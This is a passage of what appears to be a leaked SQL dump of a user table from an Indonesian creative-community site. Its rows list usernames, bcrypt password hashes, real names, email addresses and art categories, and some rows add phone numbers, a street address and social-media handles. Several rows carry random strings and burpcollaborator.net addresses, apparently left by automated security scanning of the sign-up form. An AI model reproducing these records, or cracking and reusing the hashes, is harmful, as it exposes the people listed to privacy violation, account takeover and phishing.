('putrierviana2985', '$2y$10$ji3e3w.xYt6uJYuWQxBVkOfUpNg7RGGeFyzN6btt6m4RkpgLHrjAK', 'SITI YARSIH', 'brazillu@hotmailcom', '', '', 'Lain - Lain', '66489', '', '', '', 2, '', 0, ''),
('putrierviana2991', '$2y$10$LBGBVoUEXpA6ckUHVWwZD.Hgb/dq/Y6ukdX6A.5/l6EGce3TSMS9K', 'EFITA FEBRIYANI', 'emiliopaulo662@gmail.com', '', '', 'Lain - Lain', '61651', '', '', '', 2, '', 0, ''),
('putrierviana4786', '$2y$10$YsGFzVceqObEJWAQPLI7puD6CRPt1DCLoc0rGAxGDXVtjbB0bDSfS', 'SRIYANTI', 'dannevitor@hotmail.com', '', '', 'Lain - Lain', '22671', '', '', '', 2, '', 0, ''),
('putrierviana9887', '$2y$10$OOnJXWe46N.Ir6c7tA7Bu.1a.8V9mJG/.2iUGQ.3u8rBhkUX7mufG', 'AGUS SURYANTO', 'miriangoter05@gmail.com', '', '', 'Lain - Lain', '28287', '', '', '', 2, '', 0, ''),
('putrihapianti1035', '$2y$10$j7o98O.Id6qEovr93CHp2.lNUmtpkmnxaXCnvdxUov/frimZbQrFe', 'MULYOKO', 'euaneyaseidell@gmail.com', '', '', 'Lain - Lain', '72029', '', '', '', 2, '', 0, ''),
('putrihapianti8701', '$2y$10$/60BcBI5qdg3HhdaGSIgse/uDZLGq/qIrTDL7BAtUi93temaxSQH.', 'TARMAN', 'sandrasilveira.f@hotmail.com', '', '', 'Lain - Lain', '42942', '', '', '', 2, '', 0, ''),
('putrihapianti8923', '$2y$10$8esUQN/ip5xfMyiQYJvqFehY/TdyjI4M0er4X05kjvKOnzpJd9CCa', 'SATINEM', 'rafinhastyleshowbar@gmail.com', '', '', 'Lain - Lain', '84983', '', '', '', 2, '', 0, ''),
('putrilarasati1966', '$2y$10$O4OpKZ.Ukd6mhTkl2vhI7uUWD5vKHswvLHzdPlPztpmvP7UIPhAz2', 'KISWANTO', 'leticiacunha102@gmail.com', '', '', 'Lain - Lain', '65088', '', '', '', 2, '', 0, ''),
('putrilarasati3433', '$2y$10$1e5ctAca/tNIcL98iAF3q.ZbeGYd81igZvUdB42i3ha.UJMrEF38O', 'MULYATI', 'pattycoiffeur@hotmail.com', '', '', 'Lain - Lain', '46085', '', '', '', 2, '', 0, ''),
('putrilarasati6658', '$2y$10$62worfrAi4PRL5MbQ6ibzuAM1NJMLAeQ5yk4yWY1jzgQ9uapR7ine', 'SUKIMIN', 'dianafioseformas@gmail.com', '', '', 'Lain - Lain', '31612', '', '', '', 2, '', 0, ''),
('putrilarasati7969', '$2y$10$ocmzNvz84Rj/PCeC4QxwJeu2yyQ/RtarPfmmZr3DP8kJcHHH7mk6y', 'RIMA NUR FADHILAH', 'gabrielesantosgomes@hotmail.com', '', '', 'Lain - Lain', '15094', '', '', '', 2, '', 0, ''),
('putrilestari4581', '$2y$10$8Z/n6shsc2OgGfWHLzpX0elOKMRUyzPPBowDVvOEuAw.nNx8g68Ay', 'SUMARNI', 'evandroconsolmagno@gmail.com', '', '', 'Lain - Lain', '84183', '', '', '', 2, '', 0, ''),
('putrilestari5412', '$2y$10$gYNikvC0tFNt21v6SxCjZef1y1QdTedaKIpL7um42rCrxsQE1GjO6', 'SUPALI', 'jo_fo_gomesalao@hotmail.com', '', '', 'Lain - Lain', '78622', '', '', '', 2, '', 0, ''),
('putrilestari6219', '$2y$10$a2zY2BTR.iOwuioYdptm0OcrjTuh/ls8HDArqnHqsmUxxj4YY616W', 'SUYATNI', 'gabidoba@hotmail.com', '', '', 'Lain - Lain', '70532', '', '', '', 2, '', 0, ''),
('putrilestari6458', '$2y$10$DsrBJTox6SxLUBUozT1qfOtHKAaf5nCRUtLdtq6TncAaYve7kq9oG', 'ZAIDAN KHOIRUL AFFAN', 'julianormabittencourt@hotmail.com', '', '', 'Lain - Lain', '71103', '', '', '', 2, '', 0, ''),
('putrirahmawati3192', '$2y$10$xWbtWqb/xFB65evVL7N4K.xUWAJtqrforq44Nd5zeStVhGPdF2Qjm', 'SITI SULIFAH', 'leniraraujo.08@gmail.com', '', '', 'Lain - Lain', '28624', '', '', '', 2, '', 0, ''),
('putrirenianda5631', '$2y$10$SR2dogdH/66F9npnU6YB6uCxUTNvh/wfpmhtQdlembX9WngprDVGG', 'STEVANY LIDYANA ANGGRAINI', 'gilferre0@gmail.com', '', '', 'Lain - Lain', '57605', '', '', '', 2, '', 0, ''),
('QeQkJCet', '$2y$10$BN38hGKr93fXej0DAuiBlu0D4FL5NEsRw60PuzZb1vNI98Y7uF1zC', 'QoDuYpjt', 'YSxKgHft@burpcollaborator.net', '', '', '2D', '70972', '', '', '', 2, '', 0, ''),
('QHfdYRqE', '$2y$10$bEwQuBj61ePCc4SPfucUFuE.zy8PUV51Xny64C3f87vJSO5vZ/z2i', 'LZRkqmcW', 'ziLrwnAQ@burpcollaborator.net', '', '', '', '1222', '', '', '', 2, '', 0, ''),
('QOnWYhcJ', '$2y$10$ikFu/scuObo9wzlAetZKZenjG1shwzEWA7PZjnAf.ZapwgQHcv2D6', 'USPniPHM', 'QFYNRDSn@burpcollaborator.net', '', '', '', '96391', '', '', '', 2, '', 0, ''),
('qweq', '$2y$10$ddwrfiBllpPocE7taLsF7.JyAoA69784TfUm0pc3U54nG1NfxbBjG', 'qwe', 'test@gmail.com', '', '', '2D', '71137', '', '', '', 2, '', 0, ''),
('qwerty', '$2y$10$1g7veJjFAFZPvAdjH4zaa.BW2MTtDAhBMt90VypCplEQ21B4vFYXy', 'qwerty', 'test@gmail.com', '', '', '2D', '15752', '', '', '', 2, '', 0, ''),
('rahmadhimawan_photography', '$2y$10$fpNIe0jVnUbbmd7dKZmbn.WI0QjlHC/IenoEnI1eh.cuHojzsa2kW', 'rahmad himawan', 'rahmad.himawan23@gmail.com', '', '', 'Fotografi', '56519', '', '', '', 2, '', 0, ''),
('rahmianggani', '$2y$10$EO.fQfAgNUV8UqvrMtoENeKcUvkaPc6o3JSr7pSLeWSzRAqqNbOdO', 'SOELAEMAN', 'mariacristinasouzasantosmoura@hotmail.com', '', '', 'Lain - Lain', '15443', '', '', '', 2, '', 0, ''),
('rahmiindriani2658', '$2y$10$fS2Vi.k3oJ9.XkMKC/wSiOwuCsMee1heg2FaYG.LLMB1EMDJU7ae.', 'SURIPTO', 'cintiaraquel36@gmaim.com', '', '', 'Lain - Lain', '94427', '', '', '', 2, '', 0, ''),
('rahmiyulianda801', '$2y$10$jA1eqKhmepbKF6VU7dYuLe2kI05OBiQvSR9Dm/IwM2iYFNQ4LA3kK', 'ANGGA AJI NUGROHO', 'alicedelfino1989@gmail.com', '', '', 'Lain - Lain', '593', '', '', '', 2, '', 0, ''),
('ramon', '$2y$10$38iIYgfyCdWAzLvYDTrks.FaiwcpBzH6lVwwcGSkqrw.CdMFszGZi', 'trdazs', 'vgbnd20111@gmail.com', '081336118969', '', '3D', '10328', 'http://www.instagram.com/trdazs', 'http://www.twitter.com/manusialumut', '', 2, '', 0, ''),
('renitayuliandi1191', '$2y$10$LyOxglbwQKmCpwcPSJk2t.nu00yVRPj58NYwE3vkC5UP3cBsl4wgO', 'SUPARMI', 'luciasales92@gmail.com', '', '', 'Lain - Lain', '67318', '', '', '', 2, '', 0, ''),
('renitayuliandi9177', '$2y$10$Vb.dpshfqgsdMky7GHr.6OAK8HAgUpV005tBMrFdL1V6IEV.mPHAG', 'PARDI', 'janeteferrsan@gmaio.com', '', '', 'Lain - Lain', '61092', '', '', '', 2, '', 0, ''),
('restiyuliana8640', '$2y$10$LWzq00ybgSDXAF06NQlNTeWo.uyhJ8v/16Zk.Qrhj1tH2oq8mDRM2', 'SUTRISNO', 'talineoliveira.2212@gmail.com', '', '', 'Lain - Lain', '50188', '', '', '', 2, '', 0, ''),
('restiyuliana8650', '$2y$10$U.o7JR8J9nAUeoyaAC5YW..Kb/sZPW6PwWZ9RDfceWaNmxejvGYw6', 'ERNI SETYANINGSIH', 'vagmafreire18@gmail.com', '', '', 'Lain - Lain', '68591', '', '', '', 2, '', 0, ''),
('restiyuliana8776', '$2y$10$1Pzj9wDJsNx0fVnjgT8IwOtBMSooia046vPM9hs1IZin.TdyUILRW', 'SUMARSI', 'oswaldolemos6@gmail.com', '', '', 'Lain - Lain', '45661', '', '', '', 2, '', 0, ''),
('Rfiandozz', '$2y$10$m3mPFKUlluP0RxdpN/02Fu7JYM7R7V6e0rkQJUAHeHeHFQnPiyz.2', 'Riza', 'rfiandozz@gmail.com', '', '', 'Lain - Lain', '12510', '', '', '', 2, '', 0, ''),
('rianaputri1898', '$2y$10$FfCR88pqC2Xu.l.hGzuj0uzljy1I0EsTVg7rLyvQpNo4NE0jSYNQW', 'DARYANTI', 'sabrinnaaghataa2017@gmail.com', '', '', 'Lain - Lain', '67080', '', '', '', 2, '', 0, ''),
('rianirmala1512', '$2y$10$mm0Wvxw5mVbp6qDA4FzkoeXHL.a8mOwF7F/oVCRgolxiOBdL1Yj2G', 'DWIKI SATRIA WICAKSANA', 'ymesilva@hotmail.com', '', '', 'Lain - Lain', '3166', '', '', '', 2, '', 0, ''),
('rianirmala5085', '$2y$10$cB3V/TSO8ZG6.pKY4kttG.IqPamHfwzuRbcfuNkl8x7ATbR.EKjGS', 'RIZKY ARIF SURYANTO', 'adriano.vicente.silva@hotmail.com', '', '', 'Lain - Lain', '89446', '', '', '', 2, '', 0, ''),
('riantilianda422', '$2y$10$xNafb2IykfccLZUmLDjrn.BrKmCSvRrXw/c.AAn41iLw9R3KVeDg.', 'SRI WIDAYATI', 'jucyhedrey1994@gmail.com', '', '', 'Lain - Lain', '45568', '', '', '', 2, '', 0, ''),
('riantilianda707', '$2y$10$/E4czT.AverSfM.9U7AsVug3.VNvdATXQhZd01pfLkX/ixc0pPTmK', 'TUMINO', 'thaisekayked@gmail.com', '', '', 'Lain - Lain', '40005', '', '', '', 2, '', 0, ''),
('rifai_wakid', '$2y$10$0AOO5mgaINvEJBQs.ZZyZOSnm9nIMWY.1hXrKrwDGx7a2JSz3PSye', 'Rifai Nur Wakid', 'rifaidowakid@gmail.com', '085655581309', '', 'Fotografi', '24707', 'rifai_wakid', 'Rifai_Wakid', '', 2, '', 0, ''),
('rikamelianda367', '$2y$10$x0t1ghRq8o47vkpA7vDaRusK.TpfTGWl7yb/ZhO2PTVAHQskZYkU6', 'ALIEF HERNOWO', 'danielashneider@gmail.com', '', '', 'Lain - Lain', '83266', '', '', '', 2, '', 0, ''),
('rinadebbyanti1768', '$2y$10$gjjg8GHGhN3Wxx7r4pWOWuK3CahswPOyl0FSwhK.H07nndHyhjEMS', 'SAMIYEM', 'simone.t.pivotto@hotmail.com', '', '', 'Lain - Lain', '6443', '', '', '', 2, '', 0, ''),
('rinadebbyanti2304', '$2y$10$Zu1liATmwQXab9yPChVWU.ePkex89uRJ4ma2J038o6ggflrLXfMyq', 'SUYONO', 'veronikamartinsdoamaralsilva@gmail.com', '', '', 'Lain - Lain', '19681', '', '', '', 2, '', 0, ''),
('rinafanny378', '$2y$10$IVuAtSDhq6BCJG9PvpjeN.EM9iaUMPNmRRAFE28AgTMIxS.v.jhzy', 'RAYNALDI ANANDA WAHYU', 'adrielleoliveiira@gmail.com', '', '', 'Lain - Lain', '18982', '', '', '', 2, '', 0, ''),
('rinamarina7533', '$2y$10$pYntHwn.22.BkSRxBflaUOt2Xy8/oLReTuuK0dqrLDO5f849pas9q', 'ABDURROHMAN', 'sarahekevyn@gmail.com', '', '', 'Lain - Lain', '19233', '', '', '', 2, '', 0, ''),
('rinamarina8412', '$2y$10$Ej.AswF/fhgX0L08C5QHSed8OmQq79pwsIJ30DofurIyW0udsuYMC', 'SITI SUNARNI SPd', 'miqueiasmalafaia86@gmail.com', '', '', 'Lain - Lain', '33244', '', '', '', 2, '', 0, ''),
('rinamarina8668', '$2y$10$.U1dkXbFtgOTFqW0WwOSsucXbJ5TOEW1Ht9dLZvo0BqW6aewNhrcW', 'TRI RESMI DAMIYATI', 'Jessicamonik786@gmail.com', '', '', 'Lain - Lain', '59420', '', '', '', 2, '', 0, ''),
('rinayuliana6088', '$2y$10$Adxg1TZ1bDqOsH1DJ4dGyu6R2LdevtIk3aefJ4MZwzeoT95ZXLV7i', 'LASMINI', 'brancohair5779@hotmail.com', '', '', 'Lain - Lain', '88115', '', '', '', 2, '', 0, ''),
('rinayuliana6784', '$2y$10$OVesROzm2bQzfQ11jfodHeGPF8IC9qnIk9TgIhgB6cOWXU3mCdrsu', 'SUTINI', 'lidianesantosferreira.lsf@gmail.com', '', '', 'Lain - Lain', '64710', '', '', '', 2, '', 0, ''),
('ririnfebriana6693', '$2y$10$SH7983XZt73vyJFs16QOv.vnpvnPOC3NR3FCPxDviGFgjY1WkASj.', 'AQILA NADA NAFI\'AH', 'valkrstic@gmail.com', '', '', 'Lain - Lain', '66270', '', '', '', 2, '', 0, ''),
('riskafitriana1751', '$2y$10$B7Hj0A0J1FQIEwvua0H/Gei.ZoWWyKW3ZtK45U2by0hTqfi5OrRlG', 'UMI ERAWATI', 'adenirmoura@hotmail.com', '', '', 'Lain - Lain', '15472', '', '', '', 2, '', 0, ''),
('riskafitriana6492', '$2y$10$miDjZHrX46x8Q4jfnuaOZOT.x/plKsABQvpjoXvbi4aEaR8QlL.jq', 'MARDI', 'fernandadossantosdepaula@gmail.com', '', '', 'Lain - Lain', '15033', '', '', '', 2, '', 0, ''),
('riskafitriana7941', '$2y$10$fRP2k2r8qTWntGH3HXoVNOgYYh5HtbvcTfXzVCxnmkdPfGhufhlPC', 'SRI HANDAYANI', 'analuciaproart2009@gmail.com', '', '', 'Lain - Lain', '72117', '', '', '', 2, '', 0, ''),
('riskaindrianti2428', '$2y$10$zngyL1GY1NDEC8oi0SDZeOHRoUkwglEhGYZCdsB.T6SkLJFNIOpFC', 'HARTONO', 'astudiopy@gmail.com', '', '', 'Lain - Lain', '62585', '', '', '', 2, '', 0, ''),
('riskaindrianti6194', '$2y$10$1V5qBAl/lQwVrznwYArKj.dFsQNOdqOhdxA0A0ze/8CETcecByP0i', 'YAMTI', 'amandabuenoprofissional@gmail.com', '', '', 'Lain - Lain', '39998', '', '', '', 2, '', 0, ''),
('riskaindrianti9019', '$2y$10$W2QAJg0byVBYjdlM6d8pbeDVvN.KZDQ3VgLqLMKB.d/EVU/gpIAh6', 'TARDI', 'rosicleide701@gmail.com', '', '', 'Lain - Lain', '99381', '', '', '', 2, '', 0, ''),
('riskawidiyana949', '$2y$10$C5Zjn2uLxMv1idAlL7U/1.WEFz/koweMbU.KM4ZPiunvhV0zKCsqG', 'MUHAMAD ISNAINI MAULIDANI', 'pereira_joaovitor@hotmail.com', '', '', 'Lain - Lain', '86965', '', '', '', 2, '', 0, ''),
('riskawidiyatmi2981', '$2y$10$dkneko2rroXh25.l8j/9Xuus769MctzNqcuhy4BCEmISX2qu.BiaG', 'ALIANA INTAN NURIKA', 'alinesantosramosasr@gmail.com', '', '', 'Lain - Lain', '49811', '', '', '', 2, '', 0, ''),
('riskawidiyatmi8998', '$2y$10$y7SV4t1DOC3PE6An0SIEVeRSMHu4Df8/OoDjo12Ifl7HNltTWKB6C', 'ANDIKA FERRY PRADANA', 'leonam.vieira.1998@gmail.com', '', '', 'Lain - Lain', '61696', '', '', '', 2, '', 0, ''),
('riskayuliana9030', '$2y$10$XjAecPLV5SRl4E6X0DzQKOIep9WjuG9MVQ.efQCE61hLUe8HIKzZq', 'DANAR WAHYU WIDIATMOKO', 'anaflaviatop_10@hotmail.com', '', '', 'Lain - Lain', '94927', '', '', '', 2, '', 0, ''),
('RkphNfcP', '$2y$10$gzuhbGLeSpshPOy6phOWr.vhbBXNNW/QWV2ju.uEYenY8A8947Saq', 'llbhbGjF', 'OflvDsTF@burpcollaborator.net', '', '', '2D', '15162', '', '', '', 2, '', 0, ''),
('sa666y', '$2y$10$plyFVA99tIlGQttCVAoA5OwgjbKtIoACVkEtvY2ZyDWA/MHNt2bV.', 'Inzaghi Tandyar', 'iitandyar@gmail.com', '', '', '2D', '54886', 'itandyar', 'sa666y_', '', 2, '', 0, ''),
('SadCatUnderYourBed', '$2y$10$8t84dxX6CFkm2W4ZycmhhOLTdBLi4x1qZgsIB31priCIo0xn7AxtG', 'Rinjaniaaa', 'vaniaputririnjani@gmail.com', '', '', '2D', '98471', '', '', '', 2, '', 0, ''),
('sarcadelm', '$2y$10$0v9JrmVFXSgLzqqF6a93Legf6SQs0bmT9c4caXZbdqNt/wh0/MuZy', 'sarcadelm', 'aeditht@gmail.com', '', '', 'Lain - Lain', '11743', 'aradell27', '', '', 2, '', 0, ''),
('ScayqkyT', '$2y$10$WfXTplf7npYGMawJmd2jV.4xU9F0Zkk0pKBnkceyJTKWb0Zvo03Qy', 'RMLUwPyw', 'VUOrYOni@burpcollaborator.net', '', '', 'Lain - Lain', '62023', '', '', '', 2, '', 0, ''),
('Shadi16', '$2y$10$TCa1P1cr1dtwrFlZGPF60usIbz2cSBU1CWhuvMgZ2UNsepWs/N/.O', 'Shadi', 'sasongkohadi16@gmail.com', '081218567716', 'Jakarta ', '2D', '65015', 'Hds.sketch', 'Shadioshadi', '', 2, '', 0, ''),
('silvifebrianti5892', '$2y$10$2ry2/CInmDWWfjaqtmWEGORxprrQvM4.ETkVVnpdOK1yQA8psOfUW', 'KAMIJAN', 'glowatzkyedimara@gmail.com', '', '', 'Lain - Lain', '4988', '', '', '', 2, '', 0, ''),
('sisil.kamelia', '$2y$10$NXpVKirgTKZCKjnzpO/ltuafXF1dy7xLBH0YQTw3eCch.VpYITkwu', 'SRI WIJAYANTI', 'Esioribeiropdr@gmail.com', '', '', 'Lain - Lain', '78698', '', '', '', 2, '', 0, ''),
('srihastf', '$2y$10$n2Yl88.zuCIDt8zx7kJlCOXbgJeG/PLv7rqZZS7PQhbzvA3UZROZO', 'Sri Hastuti Fatimah', 'srihastf@gmail.com', '', '', '2D', '17619', '@srihastf', '@shastutif', '', 2, '', 0, ''),
('susannahsagala', '$2y$10$B1hIsP5o0GeBqsgbua6JVefY4dRnedTew5/3fo.Da3tD74WE.BQ1K', 'MARDASIH', 'aline2012.aq@gmail.com', '', '', 'Lain - Lain', '26807', '', '', '', 2, '', 0, ''),
('susannamaharaja4216', '$2y$10$FE/Yi.8EM5xQ9dy1iqSKmOC5bIFFqjvot7du2gyBPFYJqFUDTuHUe', 'LIES INDARSIH', 'aninha-se1@hotmail.com', '', '', 'Lain - Lain', '45486', '', '', '', 2, '', 0, ''),
('susantidiancahyadi', '$2y$10$i9EK1dxmp.QK/.2O/ogFuO..UF2qkjPPr1HDRtCIoHmGVhdhMXCCO', 'ARIEF PURWANTO', 'silvestrealvesjunuor@gmail.com', '', '', 'Lain - Lain', '37098', '', '', '', 2, '', 0, ''),
('talithalumbangaol9', '$2y$10$wRT.7HrrqKbQ/Y3ZIbHPO.J2ILnETdwfoyk/0dXt9heuaQwARIndq', 'HASNA AMIROTUL HAFIDHAH', 'welingtonfreitas.b@gmail.com', '', '', 'Lain - Lain', '46310', '', '', '', 2, '', 0, ''),
('test', '$2y$10$DQBXiIm.pJc9/aoG3jmBROQ0yy3kxCVIHWhhEFPXm7pWbfGnZQyoa', 'Test', 'test@gmail.com', '', '', '--- Pilih Jenis Aliran Seni Anda ---', '52286', '', '', '', 2, '', 0, ''),
('testlagi', '$2y$10$SjUW0D0WTSvDbjsCLaiKYuB5q3VWk73JGywVs2P1In7dg0/B7WZxO', 'Aji Begawan', 'test@gmail.com', '', 'cicukang', '2D', '71878', '', '', '', 2, '', 0, ''),
('teukuievan', '$2y$10$qwS6yzU34colOy91Qquju.muaCl98gMigVDCeWErv5XvEVtr9PczS', 'Teuku Ievan', 'teukuievan27@gmail.com', '085715558769', '', '2D', '48940', 'www.instagram.com/teukuievan', 'www.twitter.com/teukuievan', '', 2, '', 0, ''),
('thesantosa', '$2y$10$XRbTpmLuXTglT5Xx37I8.eJhl6a4PfX4bh6S8.1iTUwTewXEd44sW', 'Budi Santosa', 'masbudibisa@gmail.com', '08121555154', 'Yogyakarta', '2D', '4396', 'https://www.instagram.com/thesantosa.space/', 'https://twitter.com/budibisa', '', 2, '', 0, ''),
('tiarahmawati1358', '$2y$10$3IbdYRfzLahod6HWxmV2E.IX9515so36RGX6Yt57Iaf4LzkSfVSdO', 'ASKHA MAHARDIKA', 'sandrasaia@hotmail.com', '', '', 'Lain - Lain', '72380', '', '', '', 2, '', 0, ''),
('tiarasakura2003', '$2y$10$kph0sPTnJ6iIUsZbv7/kWu/cjzYi7ZPatpKC/GsLTZS99gIJCJGgS', 'SUKATMI', 'marlene.silva1566@gmail.com', '', '', 'Lain - Lain', '72495', '', '', '', 2, '', 0, ''),
('tiarasakura3939', '$2y$10$raCFhctO5TTYCgstDVpLLeZ8VzcRFBNAcWAwI1I4N.DbGCDGswRLW', 'SUMIRAH', 'oceica758@gmail.com', '', '', 'Lain - Lain', '72571', '', '', '', 2, '', 0, ''),
('tiarasakura8103', '$2y$10$62Vro5KHV6EqOlDwhEeiceVLqkLe9XoZClyYBBnyG8ulUoNn2whhu', 'SURATMIN', 'lopesbento1994@gmail.com', '', '', 'Lain - Lain', '4467', '', '', '', 2, '', 0, ''),
('tiarasakura8853', '$2y$10$OAp79Ahc6YsW2Jyd153WD.wlmp87SZvXkiAsARcdqKN5AhwB84eWy', 'PARMINI', 'crissoliveiraa@2020gmail.com', '', '', 'Lain - Lain', '77220', '', '', '', 2, '', 0, ''),
('tiarasakura9660', '$2y$10$LyUddhmf2ULhpArcrEo8/uGr.IXIYmOXxoY5L8Zt72.vlj3V6EKsq', 'SURADI', 'julianaeduardomatos@hotmail.com', '', '', 'Lain - Lain', '60079', '', '', '', 2, '', 0, ''),
('tikapratiwi3039', '$2y$10$FfZNfjjWqm9Tc0vl6pMC9endzYnB.HNgDvbMnMGC.iVygNZXe3t4O', 'PARYANTO', 'daymilly@hotmail.com', '', '', 'Lain - Lain', '39101', '', '', '', 2, '', 0, ''),
('tikapratiwi6176', '$2y$10$9./NwVyHm4N0xrOZ4arMwOrJtw5IEeXq4BdIDP4Zh/ywDIleEIk.K', 'MISIADI', 'carla_maraia@hotmail.com', '', '', 'Lain - Lain', '44563', '', '', '', 2, '', 0, ''),
('tinaagustian6065', '$2y$10$dedvnpe1o76wLojC5oWINuBj3LMZLc5toFRwnH0UVJbcgt4Ksyj7C', 'DEWI PERMATASARI', 'sirlenedo@hotmail.com', '', '', 'Lain - Lain', '41047', '', '', '', 2, '', 0, ''),
('tinaagustian9618', '$2y$10$OQQOMHftktpkl/iHFPDGV.9v03NrpWejT2/GkF80V9uDZ3YeI4XbC', 'SUMINI', 'jc27071967@gmail.com', '', '', 'Lain - Lain', '72220', '', '', '', 2, '', 0, ''),
('Tiorigan', '$2y$10$eC.wRHOWhDQH1rxW.Fc30uLhmBuWfDhkLGXDH/BonSMAZhLT3eh8G', 'Achmad Tiorigan', 'atiorigan@gmail.com', '085706675868', 'Jakarta', 'Lain - Lain', '81878', '@tiorigan', '@torgz3', '', 2, '', 0, ''),
('tlitha', '$2y$10$ku/aY.efAqUX2XFZYSuzX.jPao5o5DdyhKSZVXq8aszobqnCHF3MK', 'Talita Putri', 'whattlt@gmail.com', '', '', '3D', '64992', '', '', '', 2, '', 0, ''),
('TrQfaeov', '$2y$10$fJWk2pg6m20AL5pe4bNrlevQ8rjdnTo13SKSFOvhiv4/dPQ/bh6fS', 'euFIpiXK', 'LrIMGBXB@burpcollaborator.net', '', '', '', '30547', '', '', '', 2, '', 0, ''),
('TsjKiXte', '$2y$10$uQG6ncnm8kdcRXmHUWGqMekTw1jy2chgFpkQ5WDShVWWhmi1AjvOW', 'boJLlspG', 'NDWdGQfU@burpcollaborator.net', '', '', '', '16850', '', '', '', 2, '', 0, ''),
('TSUbvpoQ', '$2y$10$JyeKR2wB5WDVqXo1t34GyOvPt2exjcpuBAoO7QgZ/PhHzlwj5Um2C', 'UsGUxzHq', 'hkCvXkON@burpcollaborator.net', '', '', '', '53070', '', '', '', 2, '', 0, ''),
('tWfXTotm', '$2y$10$Jv21jLPDTMSVCLn8kxfNQ.bZMWU6UYPR3oOup/2CxO6KVVefOn2xG', 'dgdbBbLn', 'ZPfnlcxW@burpcollaborator.net', '', '', '', '74780', '', '', '', 2, '', 0, ''),
('tZjbnLKG', '$2y$10$qkpSRI6Cu.betKySj7M5sOyFsYX8.Udd9Y9ybAvKLzjS3WsDslOVq', 'QXaBqBkz', 'wTTtBuFM@burpcollaborator.net', '', '', '', '4249', '', '', '', 2, '', 0, ''),
('UgTDhhrm', '$2y$10$04rzB5HueLyUId1gM7rYEuYxbX12U828qC4.FwXOR9AnKm9S/0Zdy', 'VLYjqMeG', 'gPgsOTQh@burpcollaborator.net', '', '', '', '5252', '', '', '', 2, '', 0, ''),
('UhdbATok', '$2y$10$JGqkt/Ekb5y5sDti4PHIdu3lebCzALuO72r5ROZE6zK0rUssJERlm', 'NTLpQOQz', 'KoJQbpjv@burpcollaborator.net', '', '', '', '38437', '', '', '', 2, '', 0, ''),
('uSHPNcTG', '$2y$10$s/FKDjyX4hhju0UWGV7z3.9hEAQi4cpAsmcPsjl6flyPyctFXLflO', 'uSHPNcTG', 'uSHPNcTG@burpcollaborator.net', '', '', '', '39207', '', '', '', 2, '', 0, ''),
('vallen.lubis', '$2y$10$mUH8rnN30ooNY.h8sYYXMemJ4D5XiDL14mYJegNtgWLXMitbneLkK', 'TIARA SYAH RANI', 'gufonseca@gmail.com', '', '', 'Lain - Lain', '41781', '', '', '', 2, '', 0, ''),
('vDtIPDZR', '$2y$10$4F6Eni2HpFbtvWdQuyQj4OdlHIOYSTk18rqZXAEJHLtAGd.Of4nXG', 'JrXsfyBt', 'EFqtlHaK@burpcollaborator.net', '', '', '', '72758', '', '', '', 2, '', 0, ''),
('VifUfKZW', '$2y$10$X20XbAWMb5wZay7TtWQaNuV69lLSYgunfVIObBNdZjDRl3qmwslBK', 'KMJSpyWi', 'SCZfCBIP@burpcollaborator.net', '', '', '', '19458', '', '', '', 2, '', 0, ''),
('vindarahmawati1334', '$2y$10$nskOHS3QNqPQPRrjg2jEFepwioPONGyK2qFChCH0JW8/LG3RXyCIu', 'PARNO', 'monicaisdapaula@gmail.com', '', '', 'Lain - Lain', '98835', '', '', '', 2, '', 0, ''),
('vindarahmawati166', '$2y$10$ZspNKUR/3FjcaW3vWMj10.sPORgVGM7KckqxclnDtPkpemiqPg9DO', 'ZASKIA MUTIARA LESTARI', 'erikathebas@hotmail.com', '', '', 'Lain - Lain', '65820', '', '', '', 2, '', 0, ''),
('vindarahmawati378', '$2y$10$agNgMBJ.hAh4BUQhTO07tuGkirXqBKggmwKAN558hIJqivybqxj0G', 'PARYANTI', 'lilian-santos18@hotmail.com', '', '', 'Lain - Lain', '91079', '', '', '', 2, '', 0, ''),
('Vladivostoc', '$2y$10$I2fVRr6vEhTQT9k3muwzXO5jR1u96h0SbjtnqMfWLyjBP.je9kWKe', 'Adi Nugroho', 'adi.blackmamba@gmail.com', '085348542338', 'Tanjung Raya 2 Street, Cendana Permai 1 B 16', '3D', '51860', 'https://www.instagram.com/vladivstoc/', 'https://twitter.com/Vl4divostoc', '', 2, '', 0, ''),
('wealthyisme', '$2y$10$JScVsTXFxe6glGiAppTO7.hhWvIqk41Kmk8IuT9NgvsdTz/jGTxvG', 'Belva', 'brabbani49@gmail.com', '', '', '2D', '37322', '', '', '', 2, '', 0, ''),
('WfNVrcsA', '$2y$10$kkKpHuLRCVU7NFk3eqbQwebcdF5PhRWbnrmvmQ1HTLUEY13fvhywe', 'vpLqAOEP', 'juUwnrtM@burpcollaborator.net', '', '', '2D', '18385', '', '', '', 2, '', 0, ''),
('widianingsih3596', '$2y$10$d2GCcDqmqWedkx17PIXUAO1WD3cPcy.5xr2hZKn7xa6Ale6TxPBem', 'RUSSITA NUSWANTORO', 'ana_joseneo@hotmail.com', '', '', 'Lain - Lain', '64975', '', '', '', 2, '', 0, ''),
('widianingsih4356', '$2y$10$qMkJ/IfGG2XCFZiAPIyU/uEL1D8flJgcdikBaFyrO7bk1HDbUtfpi', 'ALVARO RAID HAMIZAN MAULANA', 'giselesorrisobd@gmail.com', '', '', 'Lain - Lain', '13353', '', '', '', 2, '', 0, ''),
('widiarahmawati5008', '$2y$10$0yEOwwT8Fci8xhGw16IuGu1L6e4OCr0trQ/2pn9597gaPxVzFIoyy', 'KHUSNUL KOTIMAH', 'emayara825@gmail.com', '', '', 'Lain - Lain', '30574', '', '', '', 2, '', 0, ''),
('wiFIZQtE', '$2y$10$uBnJiJ3JZGGAYQKeC1HXf.wRmsnNRRtuJHKWPZszZCZmWsRDJyzum', 'RlNFYobq', 'PoxTYofI@burpcollaborator.net', '', '', 'Motion', '54126', '', '', '', 2, '', 0, ''),
('windakurniawati5396', '$2y$10$IgW0TasJ088SZmWRt0sPN.k2BEFqrw3D2r9OkRg5OVpvUoM1XYYqO', 'PARTI', 'gabyzane2018@gmail.com', '', '', 'Lain - Lain', '93046', '', '', '', 2, '', 0, ''),
('windakurniawati7172', '$2y$10$A3kbeqMBIfgK/N1ioAUQPu2ErgcKg.dMTGyBoLYB8Z7ywlMIUXBz6', 'RINA ASMAWI', 'naahfaria748@gmail.com', '', '', 'Lain - Lain', '78062', '', '', '', 2, '', 0, ''),
('windakurniawati7527', '$2y$10$5tW.Bdkv.biRVlVs7NJkHew9tBndsZdPs9p5nabOKpoM/FmJE2AnG', 'SUTIKEM SUTINI', 'marconeandrerodrigues@gmail.com', '', '', 'Lain - Lain', '94355', '', '', '', 2, '', 0, ''),
